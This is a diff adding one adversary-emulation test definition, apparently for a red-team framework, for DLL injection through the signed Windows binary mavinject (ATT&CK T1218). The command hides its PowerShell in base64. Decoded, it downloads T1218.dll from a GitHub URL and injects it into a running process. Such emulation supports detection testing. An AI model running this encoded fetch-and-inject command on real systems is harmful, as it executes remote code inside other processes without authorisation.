@@ -1,0 +1,18 @@
+- id: 3183ef95-ff2f-5ee0-b520-29120beb5284
+  name: Soumaia ART Tests - mavinject - Inject DLL into running process
+  description: Injects arbitrary DLL into running process specified by process ID. Requires Windows 10. (requires elevation)
+  tactic: stealth
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAuAGQAbABsACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALgBkAGwAbAAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADIAMQA4AC8AcwByAGMALwB4ADYANAAvAFQAMQAyADEAOAAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMgAxADgALgBkAGwAbAAiAAoA
+          )
+          mavinject.exe 1000 /INJECTRUNNING ".\T1218.dll"
+        payloads:
+        - T1218.dll
